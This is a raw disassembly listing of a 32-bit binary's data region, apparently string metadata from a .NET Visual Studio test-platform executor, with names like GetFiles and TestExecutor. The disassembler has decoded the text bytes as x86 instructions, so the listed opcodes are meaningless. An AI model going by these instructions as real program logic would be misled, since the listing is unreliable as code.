  40482e:	push   eax
  40482f:	ins    BYTE PTR es:[edi],dx
  404830:	popa   
  404831:	je     0x404899
  404833:	outs   dx,DWORD PTR ds:[esi]
  404834:	jb     0x4048a3
  404836:	cs dec edi
  404838:	bound  ebp,QWORD PTR [edx+0x65]
  40483b:	arpl   WORD PTR [ebp+ecx*2+0x6f],si
  40483f:	fs gs ins BYTE PTR es:[edi],dx
  404842:	add    BYTE PTR [ebp+0x71],al
  404845:	je     0x40489b
  404847:	jb     0x4048aa
  404849:	arpl   WORD PTR [ebp+0x0],sp
  40484c:	jae    0x4048b3
  40484e:	je     0x4048af
  404850:	push   esp
  404851:	jb     0x4048b4
  404853:	arpl   WORD PTR [ebp+0x4c],sp
  404856:	gs jbe 0x4048be
  404859:	ins    BYTE PTR es:[edi],dx
  40485a:	add    BYTE PTR [ebx+0x79],dl
  40485d:	jae    0x4048d3
  40485f:	gs ins DWORD PTR es:[edi],dx
  404861:	cs push esp
  404863:	push   0x64616572
  404868:	imul   ebp,DWORD PTR [esi+0x67],0x72685400
  40486f:	gs popa 
  404871:	add    BYTE PTR fs:[ebx+0x6c],dl
  404875:	gs gs jo 0x404879
  404879:	push   ebx
  40487a:	je     0x4048dd
  40487c:	jb     0x4048f2
  40487e:	add    BYTE PTR [ebp+0x6f],cl
  404881:	fs jne 0x4048f0
  404884:	add    BYTE PTR gs:[edi+0x65],ah
  404888:	je     0x4048e9
  40488a:	dec    ebp
  40488b:	outs   dx,DWORD PTR ds:[esi]
  40488c:	fs jne 0x4048fb
  40488f:	add    BYTE PTR gs:[edi+0x65],ah
  404893:	je     0x4048f4
  404895:	inc    ecx
  404896:	jae    0x40490b
  404898:	gs ins DWORD PTR es:[edi],dx
  40489a:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  40489e:	addr16 gs je 0x404901
  4048a2:	dec    esp
  4048a3:	outs   dx,DWORD PTR ds:[esi]
  4048a4:	arpl   WORD PTR [ecx+0x74],sp
  4048a7:	imul   ebp,DWORD PTR [edi+0x6e],0x73795300
  4048ae:	je     0x404915
  4048b0:	ins    DWORD PTR es:[edi],dx
  4048b1:	cs dec ecx
  4048b3:	dec    edi
  4048b4:	add    BYTE PTR [esi+0x69],al
  4048b7:	ins    BYTE PTR es:[edi],dx
  4048b8:	gs dec ecx
  4048ba:	outs   dx,BYTE PTR ds:[esi]
  4048bb:	outs   dx,WORD PTR ds:[esi]
  4048bd:	add    BYTE PTR [ecx+ebp*2+0x72],al
  4048c1:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  4048c6:	jns    0x404911
  4048c8:	outs   dx,BYTE PTR ds:[esi]
  4048c9:	outs   dx,WORD PTR ds:[esi]
  4048cb:	add    BYTE PTR [edi+0x65],ah
  4048ce:	je     0x40492f
  4048d0:	inc    esp
  4048d1:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4048d8:	jns    0x4048da
  4048da:	inc    edi
  4048db:	gs je  0x404924
  4048de:	imul   ebp,DWORD PTR [ebp+eiz*2+0x73],0x6c694600
  4048e6:	gs push ebx
  4048e8:	jns    0x40495d
  4048ea:	je     0x404951
  4048ec:	ins    DWORD PTR es:[edi],dx
  4048ed:	dec    ecx
  4048ee:	outs   dx,BYTE PTR ds:[esi]
  4048ef:	outs   dx,WORD PTR ds:[esi]
  4048f1:	add    BYTE PTR [edi+ebp*2+0x4c],dl
  4048f5:	outs   dx,DWORD PTR ds:[esi]
  4048f6:	ja     0x40495d
  4048f8:	jb     0x4048fa
  4048fa:	inc    ebx
  4048fb:	outs   dx,DWORD PTR ds:[esi]
  4048fc:	outs   dx,BYTE PTR ds:[esi]
  4048fd:	je     0x404960
  4048ff:	imul   ebp,DWORD PTR [esi+0x73],0x74656700
  404906:	pop    edi
  404907:	inc    ebp
  404908:	js     0x40497e
  40490a:	outs   dx,BYTE PTR gs:[esi]
  40490c:	jae    0x404977
  40490e:	outs   dx,DWORD PTR ds:[esi]
  40490f:	outs   dx,BYTE PTR ds:[esi]
  404910:	add    BYTE PTR [edi+ebp*2+0x4c],dl
  404914:	outs   dx,DWORD PTR ds:[esi]
  404915:	ja     0x40497c
  404917:	jb     0x404962
  404919:	outs   dx,BYTE PTR ds:[esi]
  40491a:	jbe    0x40497d
  40491c:	jb     0x404987
  40491e:	popa   
  40491f:	outs   dx,BYTE PTR ds:[esi]
  404920:	je     0x404922
  404922:	push   eax
  404923:	popa   
  404924:	je     0x40498e
  404926:	add    BYTE PTR [edi+0x65],al
  404929:	je     0x404971
  40492b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  404933:	imul   esi,DWORD PTR [eax+ebp*2+0x6f],0x78457475
  40493b:	je     0x4049a2
  40493d:	outs   dx,BYTE PTR ds:[esi]
  40493e:	jae    0x4049a9
  404940:	outs   dx,DWORD PTR ds:[esi]
  404941:	outs   dx,BYTE PTR ds:[esi]
  404942:	add    BYTE PTR [ebx+0x6f],al
  404945:	ins    DWORD PTR es:[edi],dx
  404946:	jo     0x4049a9
  404948:	jb     0x4049af
  40494a:	add    BYTE PTR [edi+ecx*2],bh
  40494d:	outs   dx,BYTE PTR ds:[esi]
  40494e:	dec    esp
  40494f:	popa   
  404950:	jne    0x4049c0
  404952:	arpl   WORD PTR [eax+0x65],bp
  404955:	fs bound ebx,QWORD PTR ds:[edi+0x5f]
  40495a:	xor    BYTE PTR [eax],al
  40495c:	push   esp
  40495d:	push   0x64616572
  404962:	push   ebx
  404963:	je     0x4049c6
  404965:	jb     0x4049db
  404967:	add    BYTE PTR [ebp+0x69],cl
  40496a:	arpl   WORD PTR [edx+0x6f],si
  40496d:	jae    0x4049de
  40496f:	data16 je 0x4049a0
  404972:	push   esi
  404973:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  40497a:	jne    0x4049e0
  40497c:	imul   ebp,DWORD PTR [edi+0x2e],0x74736554
  404983:	push   eax
  404984:	ins    BYTE PTR es:[edi],dx
  404985:	popa   
  404986:	je     0x4049ee
  404988:	outs   dx,DWORD PTR ds:[esi]
  404989:	jb     0x4049f8
  40498b:	cs push esp
  40498d:	gs jae 0x404a04
  404990:	inc    ebp
  404991:	js     0x4049f8
  404993:	arpl   WORD PTR [ebp+0x74],si
  404996:	outs   dx,DWORD PTR ds:[esi]
  404997:	jb     0x4049c7
  404999:	inc    ebx
  40499a:	outs   dx,DWORD PTR ds:[esi]
  40499b:	jb     0x404a02
  40499d:	add    BYTE PTR [ebp+0x69],cl
  4049a0:	arpl   WORD PTR [edx+0x6f],si
  4049a3:	jae    0x404a14
  4049a5:	data16 je 0x4049d6
  4049a8:	push   esi
  4049a9:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  4049b0:	jne    0x404a16
  4049b2:	imul   ebp,DWORD PTR [edi+0x2e],0x74736554
  4049b9:	push   eax
  4049ba:	ins    BYTE PTR es:[edi],dx
  4049bb:	popa   
  4049bc:	je     0x404a24
  4049be:	outs   dx,DWORD PTR ds:[esi]
  4049bf:	jb     0x404a2e
  4049c1:	cs push esp
  4049c3:	gs jae 0x404a3a
  4049c6:	inc    ebp
  4049c7:	js     0x404a2e
  4049c9:	arpl   WORD PTR [ebp+0x74],si
  4049cc:	outs   dx,DWORD PTR ds:[esi]
  4049cd:	jb     0x4049cf
  4049cf:	push   esp
  4049d0:	gs jae 0x404a47
  4049d3:	inc    ebp
  4049d4:	js     0x404a3b
  4049d6:	arpl   WORD PTR [ebp+0x74],si
  4049d9:	outs   dx,DWORD PTR ds:[esi]
  4049da:	jb     0x404a29
  4049dc:	popa   
  4049dd:	imul   ebp,DWORD PTR [esi+0x0],0x6e7552
  4049e4:	inc    ebp
  4049e5:	js     0x404a50
  4049e7:	je     0x4049e9
  4049e9:	inc    ecx
  4049ea:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  4049ee:	popa   
  4049ef:	je     0x404a5a
  4049f1:	outs   dx,DWORD PTR ds:[esi]
  4049f2:	outs   dx,BYTE PTR ds:[esi]
  4049f3:	dec    ebx
  4049f4:	imul   ebp,DWORD PTR [esi+0x64],0x74656700
  4049fb:	pop    edi
  4049fc:	dec    ebx
  4049fd:	imul   ebp,DWORD PTR [esi+0x64],0x63632e00
  404a04:	je     0x404a75
  404a06:	jb     0x404a08
  404a08:	add    BYTE PTR ds:0x730075,bl
  404a0e:	add    BYTE PTR gs:[edx+0x0],dh
  404a12:	inc    ecx
  404a13:	add    BYTE PTR [ebx+0x0],dh
  404a16:	jae    0x404a18
  404a18:	add    BYTE PTR gs:[esi+0x0],ch
  404a1c:	bound  eax,QWORD PTR [eax]
  404a1e:	ins    BYTE PTR es:[edi],dx
  404a1f:	add    BYTE PTR [ecx+0x0],ch
  404a22:	add    BYTE PTR gs:[ebx+0x0],dh
  404a26:	add    BYTE PTR [ecx+0x7b],ah
  404a29:	add    BYTE PTR [eax],dh
  404a2b:	add    BYTE PTR [ebp+0x0],bh
  404a2e:	sub    al,0x0
  404a30:	and    BYTE PTR [eax],al
  404a32:	push   edi
  404a33:	add    BYTE PTR [ecx+0x0],ch
  404a36:	outs   dx,BYTE PTR ds:[esi]
  404a37:	add    BYTE PTR [eax+eax*1+0x6f],ah
  404a3b:	add    BYTE PTR [edi+0x0],dh
  404a3e:	jae    0x404a40
  404a40:	add    BYTE PTR cs:[ebp+0x0],dl
  404a44:	dec    ecx
  404a45:	add    BYTE PTR [esi],ch
  404a47:	add    BYTE PTR [eax+0x0],bl
  404a4a:	popa   
  404a4b:	add    BYTE PTR [ebp+0x0],ch
  404a4e:	ins    BYTE PTR es:[edi],dx
  404a4f:	add    BYTE PTR [eax+eax*1],ch
  404a52:	and    BYTE PTR [eax],al
  404a54:	inc    ebx
  404a55:	add    BYTE PTR [edi+0x0],ch
  404a58:	outs   dx,BYTE PTR ds:[esi]
  404a59:	add    BYTE PTR [eax+eax*1+0x65],dh
  404a5d:	add    BYTE PTR [esi+0x0],ch
  404a60:	je     0x404a62
  404a62:	push   esp
  404a63:	add    BYTE PTR [ecx+0x0],bh
  404a66:	jo     0x404a68
  404a68:	add    BYTE PTR gs:0x69005700,bh
  404a6f:	add    BYTE PTR [esi+0x0],ch
  404a72:	add    BYTE PTR fs:[edi+0x0],ch
  404a76:	ja     0x404a78
  404a78:	jae    0x404a7a
  404a7a:	push   edx
  404a7b:	add    BYTE PTR [ebp+0x0],dh
  404a7e:	outs   dx,BYTE PTR ds:[esi]
  404a7f:	add    BYTE PTR [eax+eax*1+0x69],dh
  404a83:	add    BYTE PTR [ebp+0x0],ch
  404a86:	add    BYTE PTR gs:[eax],al
  404a89:	adc    DWORD PTR [ebx+0x0],edi
  404a8c:	xor    BYTE PTR [eax],al
  404a8e:	jge    0x404a90
  404a90:	sub    al,0x0
  404a92:	and    BYTE PTR [eax],al
  404a94:	jnp    0x404a96
  404a96:	xor    DWORD PTR [eax],eax
  404a98:	jge    0x404a9a
  404a9a:	add    BYTE PTR [edi],bl
  404a9c:	push   edi
  404a9d:	add    BYTE PTR [ecx+0x0],ch
  404aa0:	outs   dx,BYTE PTR ds:[esi]
  404aa1:	add    BYTE PTR [eax+eax*1+0x6f],ah
  404aa5:	add    BYTE PTR [edi+0x0],dh
  404aa8:	jae    0x404aaa
  404aaa:	add    BYTE PTR cs:[ebp+0x0],dl
  404aae:	dec    ecx
  404aaf:	add    BYTE PTR [esi],ch
  404ab1:	add    BYTE PTR [eax+0x0],bl
  404ab4:	popa   
  404ab5:	add    BYTE PTR [ebp+0x0],ch
  404ab8:	ins    BYTE PTR es:[edi],dx
  404ab9:	add    BYTE PTR [eax],al
  404abb:	and    eax,0x690057
  404ac0:	outs   dx,BYTE PTR ds:[esi]
  404ac1:	add    BYTE PTR [eax+eax*1+0x6f],ah
  404ac5:	add    BYTE PTR [edi+0x0],dh
  404ac8:	jae    0x404aca
  404aca:	add    BYTE PTR cs:[esi+0x0],al
  404ace:	outs   dx,DWORD PTR ds:[esi]
  404acf:	add    BYTE PTR [ebp+0x0],dh
  404ad2:	outs   dx,BYTE PTR ds:[esi]
  404ad3:	add    BYTE PTR [eax+eax*1+0x61],ah
  404ad7:	add    BYTE PTR [eax+eax*1+0x69],dh
  404adb:	add    BYTE PTR [edi+0x0],ch
  404ade:	outs   dx,BYTE PTR ds:[esi]
  404adf:	add    BYTE PTR [eax],al
  404ae1:	or     eax,0x790053
  404ae6:	jae    0x404ae8
  404ae8:	je     0x404aea
  404aea:	add    BYTE PTR gs:[ebp+0x0],ch
  404aee:	add    BYTE PTR [ecx],cl
  404af0:	dec    esi
  404af1:	add    BYTE PTR [ecx+0x0],ah
  404af4:	ins    DWORD PTR es:[edi],dx
  404af5:	add    BYTE PTR [ebp+0x0],ah
  404af8:	add    BYTE PTR [edi],al
  404afa:	inc    ecx
  404afb:	add    BYTE PTR [eax+eax*1+0x64],ah
  404aff:	add    BYTE PTR [eax],al
  404b01:	adc    eax,0x610054
  404b06:	jb     0x404b08
  404b08:	add    BYTE PTR [di+0x0],ah
  404b0c:	je     0x404b0e
  404b0e:	push   esp
  404b0f:	add    BYTE PTR [ecx+0x0],bh
  404b12:	jo     0x404b14
  404b14:	add    BYTE PTR gs:[eax],al
  404b17:	adc    DWORD PTR [edi+0x0],eax
  404b1a:	add    BYTE PTR gs:[eax+eax*1+0x56],dh
  404b1f:	add    BYTE PTR [ecx+0x0],ah
  404b22:	ins    BYTE PTR es:[edi],dx
  404b23:	add    BYTE PTR [ebp+0x0],dh
  404b26:	add    BYTE PTR gs:[eax],al
  404b29:	adc    DWORD PTR [ebx+0x0],edx
  404b2c:	add    BYTE PTR gs:[eax+eax*1+0x56],dh
  404b31:	add    BYTE PTR [ecx+0x0],ah
  404b34:	ins    BYTE PTR es:[edi],dx
  404b35:	add    BYTE PTR [ebp+0x0],dh
  404b38:	add    BYTE PTR gs:[eax],al
  404b3b:	xor    eax,0x530056
  404b40:	push   esp
  404b41:	add    BYTE PTR [ebp+0x0],al
  404b44:	push   ebx
  404b45:	add    BYTE PTR [eax+eax*1+0x45],dl
  404b49:	add    BYTE PTR [eax+0x0],bl
  404b4c:	inc    ebp
  404b4d:	add    BYTE PTR [ebx+0x0],al
  404b50:	push   ebp
  404b51:	add    BYTE PTR [eax+eax*1+0x4f],dl
  404b55:	add    BYTE PTR [edx+0x0],dl
  404b58:	pop    edi
  404b59:	add    BYTE PTR [eax+eax*1+0x52],dl
  404b5d:	add    BYTE PTR [ecx+0x0],al
  404b60:	inc    ebx
  404b61:	add    BYTE PTR [ebp+0x0],al
  404b64:	pop    edi
  404b65:	add    BYTE PTR [eax+eax*1+0x45],cl
  404b69:	add    BYTE PTR [esi+0x0],dl
  404b6c:	inc    ebp
  404b6d:	add    BYTE PTR [eax+eax*1+0x0],cl
  404b71:	sub    DWORD PTR [edi+0x0],ebx
  404b74:	pop    edi
  404b75:	add    BYTE PTR [ecx+0x0],cl
  404b78:	dec    esi
  404b79:	add    BYTE PTR [eax+eax*1+0x45],dl
  404b7d:	add    BYTE PTR [edx+0x0],dl
  404b80:	dec    esi
  404b81:	add    BYTE PTR [ecx+0x0],al
  404b84:	dec    esp
  404b85:	add    BYTE PTR [edi+0x0],bl
  404b88:	push   ebx
  404b89:	add    BYTE PTR [eax+eax*1+0x45],cl
  404b8d:	add    BYTE PTR [ebp+0x0],al
  404b90:	push   eax
  404b91:	add    BYTE PTR [ebp+0x0],cl
  404b94:	push   ebx
  404b95:	add    BYTE PTR [edi+0x0],bl
  404b98:	pop    edi
  404b99:	add    BYTE PTR [eax],al
  404b9b:	inc    ebx
  404b9c:	push   edi
  404b9d:	add    BYTE PTR [ecx+0x0],ch
  404ba0:	outs   dx,BYTE PTR ds:[esi]
  404ba1:	add    BYTE PTR [eax+eax*1+0x6f],ah
  404ba5:	add    BYTE PTR [edi+0x0],dh
  404ba8:	jae    0x404baa
  404baa:	add    BYTE PTR cs:[ebp+0x0],dl
  404bae:	dec    ecx
  404baf:	add    BYTE PTR [esi],ch
  404bb1:	add    BYTE PTR [eax+0x0],bl
  404bb4:	popa   
  404bb5:	add    BYTE PTR [ebp+0x0],ch
  404bb8:	ins    BYTE PTR es:[edi],dx
  404bb9:	add    BYTE PTR [esi],ch
  404bbb:	add    BYTE PTR [ecx+0x0],cl
  404bbe:	inc    esp
  404bbf:	add    BYTE PTR [ebp+0x0],ah
  404bc2:	jo     0x404bc4
  404bc4:	add    BYTE PTR gs:[esi+0x0],ch
  404bc8:	add    BYTE PTR fs:[ebp+0x0],ah
  404bcc:	outs   dx,BYTE PTR ds:[esi]
  404bcd:	add    BYTE PTR [ebx+0x0],ah
  404bd0:	jns    0x404bd2
  404bd2:	dec    edi
  404bd3:	add    BYTE PTR [edx+0x0],ah
  404bd6:	push   0x0
  404bd8:	add    BYTE PTR gs:[ebx+0x0],ah
  404bdc:	je     0x404bde
  404bde:	add    BYTE PTR [ecx],ah
  404be0:	das    
  404be1:	add    BYTE PTR [eax+0x0],dh
  404be4:	popa   
  404be5:	add    BYTE PTR [edx+0x0],dh
  404be8:	add    BYTE PTR gs:[esi+0x0],ch
  404bec:	je     0x404bee
  404bee:	push   eax
  404bef:	add    BYTE PTR [edx+0x0],dh
  404bf2:	outs   dx,DWORD PTR ds:[esi]
  404bf3:	add    BYTE PTR [ebx+0x0],ah
  404bf6:	add    BYTE PTR gs:[ebx+0x0],dh
  404bfa:	jae    0x404bfc
  404bfc:	dec    ecx
  404bfd:	add    BYTE PTR [eax+eax*1+0x0],ah
  404c01:	add    esi,DWORD PTR [eax]
  404c03:	add    BYTE PTR [eax],al
  404c05:	sbb    ebp,DWORD PTR [edi]
  404c07:	add    BYTE PTR [ecx+0x0],al
  404c0a:	jo     0x404c0c
  404c0c:	jo     0x404c0e
  404c0e:	inc    ebx
  404c0f:	add    BYTE PTR [edi+0x0],ch
  404c12:	outs   dx,BYTE PTR ds:[esi]
  404c13:	add    BYTE PTR [eax+eax*1+0x61],dh
  404c17:	add    BYTE PTR [ecx+0x0],ch
  404c1a:	outs   dx,BYTE PTR ds:[esi]
  404c1b:	add    BYTE PTR [ebp+0x0],ah
  404c1e:	jb     0x404c20
  404c20:	add    BYTE PTR [ecx],cl
  404c22:	add    BYTE PTR cs:[ebp+0x0],ah
  404c26:	js     0x404c28
  404c28:	add    BYTE PTR gs:[eax],al
  404c2b:	or     DWORD PTR [esi],ebp
  404c2d:	add    BYTE PTR [eax+eax*1+0x6c],ah
  404c31:	add    BYTE PTR [eax+eax*1+0x0],ch
  404c35:	or     eax,0x77002e
  404c3a:	imul   eax,DWORD PTR [eax],0x6d006e
  404c40:	add    BYTE PTR fs:[eax],al
  404c43:	jae    0x404cb2
  404c45:	add    BYTE PTR [ecx+0x0],ch
  404c48:	arpl   WORD PTR [eax],ax
  404c4a:	jb     0x404c4c
  404c4c:	outs   dx,DWORD PTR ds:[esi]
  404c4d:	add    BYTE PTR [ebx+0x0],dh
  404c50:	outs   dx,DWORD PTR ds:[esi]
  404c51:	add    BYTE PTR [esi+0x0],ah
  404c54:	je     0x404c56
  404c56:	add    BYTE PTR cs:[esi+0x0],dh
  404c5a:	imul   eax,DWORD PTR [eax],0x750073
  404c60:	popa   
  404c61:	add    BYTE PTR [eax+eax*1+0x73],ch
  404c65:	add    BYTE PTR [eax+eax*1+0x75],dh
  404c69:	add    BYTE PTR [eax+eax*1+0x69],ah
  404c6d:	add    BYTE PTR [edi+0x0],ch
  404c70:	add    BYTE PTR cs:[ecx+0x0],dh
  404c74:	jne    0x404c76
  404c76:	popa   
  404c77:	add    BYTE PTR [eax+eax*1+0x69],ch
  404c7b:	add    BYTE PTR [eax+eax*1+0x79],dh
  404c7f:	add    BYTE PTR [eax+eax*1+0x6f],dh
  404c83:	add    BYTE PTR [edi+0x0],ch
  404c86:	ins    BYTE PTR es:[edi],dx
  404c87:	add    BYTE PTR [ebx+0x0],dh
  404c8a:	add    BYTE PTR cs:[ebp+0x0],dh
  404c8e:	outs   dx,BYTE PTR ds:[esi]
  404c8f:	add    BYTE PTR [ecx+0x0],ch
  404c92:	je     0x404c94
  404c94:	je     0x404c96
  404c96:	add    BYTE PTR gs:[ebx+0x0],dh
  404c9a:	je     0x404c9c
  404c9c:	data16 add BYTE PTR [edx+0x0],dh
  404ca0:	popa   
  404ca1:	add    BYTE PTR [ebp+0x0],ch
  404ca4:	add    BYTE PTR gs:[edi+0x0],dh
  404ca8:	outs   dx,DWORD PTR ds:[esi]
  404ca9:	add    BYTE PTR [edx+0x0],dh
  404cac:	imul   eax,DWORD PTR [eax],0x2e
  404caf:	add    BYTE PTR [eax+eax*1+0x6c],ah
  404cb3:	add    BYTE PTR [eax+eax*1+0x0],ch
  404cb7:	pop    ecx
  404cb8:	ins    DWORD PTR es:[edi],dx
  404cb9:	add    BYTE PTR [ecx+0x0],ch
  404cbc:	arpl   WORD PTR [eax],ax
  404cbe:	jb     0x404cc0
  404cc0:	outs   dx,DWORD PTR ds:[esi]
  404cc1:	add    BYTE PTR [ebx+0x0],dh
  404cc4:	outs   dx,DWORD PTR ds:[esi]
  404cc5:	add    BYTE PTR [esi+0x0],ah
  404cc8:	je     0x404cca
  404cca:	add    BYTE PTR cs:[esi+0x0],dh
  404cce:	imul   eax,DWORD PTR [eax],0x750073
  404cd4:	popa   
  404cd5:	add    BYTE PTR [eax+eax*1+0x73],ch
  404cd9:	add    BYTE PTR [eax+eax*1+0x75],dh
  404cdd:	add    BYTE PTR [eax+eax*1+0x69],ah
  404ce1:	add    BYTE PTR [edi+0x0],ch
  404ce4:	add    BYTE PTR cs:[eax+eax*1+0x65],dh
  404ce9:	add    BYTE PTR [ebx+0x0],dh
  404cec:	je     0x404cee
  404cee:	jo     0x404cf0
  404cf0:	ins    BYTE PTR es:[edi],dx
  404cf1:	add    BYTE PTR [ecx+0x0],ah
  404cf4:	je     0x404cf6
  404cf6:	data16 add BYTE PTR [edi+0x0],ch
  404cfa:	jb     0x404cfc
  404cfc:	ins    DWORD PTR es:[edi],dx
  404cfd:	add    BYTE PTR [esi],ch
  404cff:	add    BYTE PTR [ebx+0x0],ah
  404d02:	outs   dx,DWORD PTR ds:[esi]
  404d03:	add    BYTE PTR [edx+0x0],dh
  404d06:	add    BYTE PTR gs:[esi],ch
  404d09:	add    BYTE PTR [eax+eax*1+0x6c],ah
  404d0d:	add    BYTE PTR [eax+eax*1+0x0],ch
  404d11:	jae    0x404d80
  404d13:	add    BYTE PTR [ecx+0x0],ch
  404d16:	arpl   WORD PTR [eax],ax
  404d18:	jb     0x404d1a
  404d1a:	outs   dx,DWORD PTR ds:[esi]
  404d1b:	add    BYTE PTR [ebx+0x0],dh
  404d1e:	outs   dx,DWORD PTR ds:[esi]
  404d1f:	add    BYTE PTR [esi+0x0],ah
  404d22:	je     0x404d24
  404d24:	add    BYTE PTR cs:[esi+0x0],dh
  404d28:	imul   eax,DWORD PTR [eax],0x750073
  404d2e:	popa   
  404d2f:	add    BYTE PTR [eax+eax*1+0x73],ch
  404d33:	add    BYTE PTR [eax+eax*1+0x75],dh
  404d37:	add    BYTE PTR [eax+eax*1+0x69],ah
  404d3b:	add    BYTE PTR [edi+0x0],ch
  404d3e:	add    BYTE PTR cs:[eax+eax*1+0x65],dh
  404d43:	add    BYTE PTR [ebx+0x0],dh
  404d46:	je     0x404d48
  404d48:	jo     0x404d4a
  404d4a:	ins    BYTE PTR es:[edi],dx
  404d4b:	add    BYTE PTR [ecx+0x0],ah
  404d4e:	je     0x404d50
  404d50:	data16 add BYTE PTR [edi+0x0],ch
  404d54:	jb     0x404d56
  404d56:	ins    DWORD PTR es:[edi],dx
  404d57:	add    BYTE PTR [esi],ch
  404d59:	add    BYTE PTR [eax+eax*1+0x65],dh
  404d5d:	add    BYTE PTR [ebx+0x0],dh
  404d60:	je     0x404d62
  404d62:	add    BYTE PTR gs:[eax+0x0],bh
  404d66:	add    BYTE PTR gs:[ebx+0x0],ah
  404d6a:	jne    0x404d6c
  404d6c:	je     0x404d6e
  404d6e:	outs   dx,DWORD PTR ds:[esi]
  404d6f:	add    BYTE PTR [edx+0x0],dh
  404d72:	add    BYTE PTR cs:[ebx+0x0],ah
  404d76:	outs   dx,DWORD PTR ds:[esi]
  404d77:	add    BYTE PTR [edx+0x0],dh
  404d7a:	add    BYTE PTR gs:[esi],ch
  404d7d:	add    BYTE PTR [eax+eax*1+0x6c],ah
  404d81:	add    BYTE PTR [eax+eax*1+0x0],ch
  404d85:	or     BYTE PTR [ecx+0x69006d],0x63
  404d8c:	add    BYTE PTR [edx+0x0],dh
  404d8f:	outs   dx,DWORD PTR ds:[esi]
  404d90:	add    BYTE PTR [ebx+0x0],dh
  404d93:	outs   dx,DWORD PTR ds:[esi]
  404d94:	add    BYTE PTR [esi+0x0],ah
  404d97:	je     0x404d99
  404d99:	add    BYTE PTR cs:[esi+0x0],dh
  404d9d:	imul   eax,DWORD PTR [eax],0x750073
  404da3:	popa   
  404da4:	add    BYTE PTR [eax+eax*1+0x73],ch
  404da8:	add    BYTE PTR [eax+eax*1+0x75],dh
  404dac:	add    BYTE PTR [eax+eax*1+0x69],ah
  404db0:	add    BYTE PTR [edi+0x0],ch
  404db3:	add    BYTE PTR cs:[eax+eax*1+0x65],dh
  404db8:	add    BYTE PTR [ebx+0x0],dh
  404dbb:	je     0x404dbd
  404dbd:	jo     0x404dbf
  404dbf:	ins    BYTE PTR es:[edi],dx
  404dc0:	add    BYTE PTR [ecx+0x0],ah
  404dc3:	je     0x404dc5
  404dc5:	data16 add BYTE PTR [edi+0x0],ch
  404dc9:	jb     0x404dcb
  404dcb:	ins    DWORD PTR es:[edi],dx
  404dcc:	add    BYTE PTR [esi],ch
  404dce:	add    BYTE PTR [ebp+0x0],ah
  404dd1:	js     0x404dd3
  404dd3:	je     0x404dd5
  404dd5:	add    BYTE PTR gs:[esi+0x0],ch
  404dd9:	jae    0x404ddb
  404ddb:	imul   eax,DWORD PTR [eax],0x6e006f
  404de1:	jae    0x404de3
  404de3:	add    BYTE PTR cs:[esi+0x0],dh
  404de7:	jae    0x404de9
  404de9:	je     0x404deb
  404deb:	add    BYTE PTR gs:[ebx+0x0],dh
  404def:	je     0x404df1
  404df1:	imul   eax,DWORD PTR [eax],0x74006e
  404df7:	add    BYTE PTR gs:[edi+0x0],ah
  404dfb:	jb     0x404dfd
  404dfd:	popa   
  404dfe:	add    BYTE PTR [eax+eax*1+0x69],dh
  404e02:	add    BYTE PTR [edi+0x0],ch
  404e05:	outs   dx,BYTE PTR ds:[esi]
  404e06:	add    BYTE PTR [esi],ch
  404e08:	add    BYTE PTR [eax+eax*1+0x6c],ah
  404e0c:	add    BYTE PTR [eax+eax*1+0x0],ch
  404e10:	ins    DWORD PTR es:[di],dx
  404e12:	add    BYTE PTR [ecx+0x0],ch
  404e15:	arpl   WORD PTR [eax],ax
  404e17:	jb     0x404e19
  404e19:	outs   dx,DWORD PTR ds:[esi]
  404e1a:	add    BYTE PTR [ebx+0x0],dh
  404e1d:	outs   dx,DWORD PTR ds:[esi]
  404e1e:	add    BYTE PTR [esi+0x0],ah
  404e21:	je     0x404e23
  404e23:	add    BYTE PTR cs:[esi+0x0],dh
  404e27:	imul   eax,DWORD PTR [eax],0x750073
  404e2d:	popa   
  404e2e:	add    BYTE PTR [eax+eax*1+0x73],ch
  404e32:	add    BYTE PTR [eax+eax*1+0x75],dh
  404e36:	add    BYTE PTR [eax+eax*1+0x69],ah
  404e3a:	add    BYTE PTR [edi+0x0],ch
  404e3d:	add    BYTE PTR cs:[eax+eax*1+0x65],dh
  404e42:	add    BYTE PTR [ebx+0x0],dh
  404e45:	je     0x404e47
  404e47:	jo     0x404e49
  404e49:	ins    BYTE PTR es:[edi],dx
  404e4a:	add    BYTE PTR [ecx+0x0],ah
  404e4d:	je     0x404e4f
  404e4f:	data16 add BYTE PTR [edi+0x0],ch
  404e53:	jb     0x404e55
  404e55:	ins    DWORD PTR es:[edi],dx
  404e56:	add    BYTE PTR [esi],ch
  404e58:	add    BYTE PTR [edi+0x0],ch
  404e5b:	bound  eax,QWORD PTR [eax]
  404e5d:	push   0x0
  404e5f:	add    BYTE PTR gs:[ebx+0x0],ah
  404e63:	je     0x404e65
  404e65:	ins    DWORD PTR es:[edi],dx
  404e66:	add    BYTE PTR [edi+0x0],ch
  404e69:	add    BYTE PTR fs:[ebp+0x0],ah
  404e6d:	ins    BYTE PTR es:[edi],dx
  404e6e:	add    BYTE PTR [esi],ch
  404e70:	add    BYTE PTR [eax+eax*1+0x6c],ah
  404e74:	add    BYTE PTR [eax+eax*1+0x0],ch
  404e78:	arpl   WORD PTR [ebp+0x0],bp
  404e7b:	imul   eax,DWORD PTR [eax],0x720063
  404e81:	outs   dx,DWORD PTR ds:[esi]
  404e82:	add    BYTE PTR [ebx+0x0],dh
  404e85:	outs   dx,DWORD PTR ds:[esi]
  404e86:	add    BYTE PTR [esi+0x0],ah
  404e89:	je     0x404e8b
  404e8b:	add    BYTE PTR cs:[esi+0x0],dh
  404e8f:	imul   eax,DWORD PTR [eax],0x750073
  404e95:	popa   
  404e96:	add    BYTE PTR [eax+eax*1+0x73],ch
  404e9a:	add    BYTE PTR [eax+eax*1+0x75],dh
  404e9e:	add    BYTE PTR [eax+eax*1+0x69],ah
  404ea2:	add    BYTE PTR [edi+0x0],ch
  404ea5:	add    BYTE PTR cs:[eax+eax*1+0x65],dh
  404eaa:	add    BYTE PTR [ebx+0x0],dh
  404ead:	je     0x404eaf
  404eaf:	jo     0x404eb1
  404eb1:	ins    BYTE PTR es:[edi],dx
  404eb2:	add    BYTE PTR [ecx+0x0],ah
  404eb5:	je     0x404eb7
  404eb7:	data16 add BYTE PTR [edi+0x0],ch
  404ebb:	jb     0x404ebd
  404ebd:	ins    DWORD PTR es:[edi],dx
